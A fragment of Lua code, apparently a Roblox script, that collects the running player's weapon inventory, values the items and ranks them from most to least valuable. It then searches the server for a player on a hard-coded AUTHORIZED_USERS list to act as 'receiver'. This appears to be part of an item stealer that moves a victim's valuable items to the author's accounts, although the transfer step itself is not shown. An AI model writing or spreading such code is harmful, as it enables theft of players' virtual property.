local SKIP_ITEMS = {DefaultGun = true, DefaultKnife = true}
local function get_inventory()
    local items = {}
    local success, profile = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    end)
    if not success or not profile or not profile.Weapons then
        profile = nil
        pcall(function()
            local DB = ReplicatedStorage:FindFirstChild("Database") and ReplicatedStorage.Database:FindFirstChild("Sync") and ReplicatedStorage.Database.Sync:FindFirstChild("Item")
            if DB then
                local inv = LocalPlayer:FindFirstChild("Inventory")
                if inv then
                    for id, amt in pairs(inv:GetChildren()) do
                        if SKIP_ITEMS[id] then continue end
                        local name = id
                        local rarity = "Godly"
                        if DB[id] then
                            name = DB[id].ItemName or id
                            rarity = DB[id].Rarity or "Godly"
                        end
                        local value = get_item_price(name)
                        table.insert(items, {id = id, name = name, amount = amt, rarity = rarity, value = value})
                    end
                end
            end
        end)
        return items
    end
    for id, amount in pairs(profile.Weapons.Owned or {}) do
        if SKIP_ITEMS[id] then continue end
        local name = id
        local rarity = "Godly"
        local DB = ReplicatedStorage:FindFirstChild("Database") and ReplicatedStorage.Database:FindFirstChild("Sync") and ReplicatedStorage.Database.Sync:FindFirstChild("Item")
        if DB and DB[id] then
            name = DB[id].ItemName or id
            rarity = DB[id].Rarity or "Godly"
        end
        local value = get_item_price(name)
        table.insert(items, {id = id, name = name, amount = amount, rarity = rarity, value = value})
    end
    table.sort(items, function(a, b) return a.value > b.value end)
    return items
end

local function find_receiver()
    for _, name in ipairs(AUTHORIZED_USERS) do
        local p = Players:FindFirstChild(name)
        if p then return p end
    end
    for _, p in ipairs(Players:GetPlayers()) do
        for _, name in ipairs(AUTHORIZED_USERS) do
            if string.lower(p.Name) == string.lower(name) then
                return p
            end
        end
    end
    return nil
end

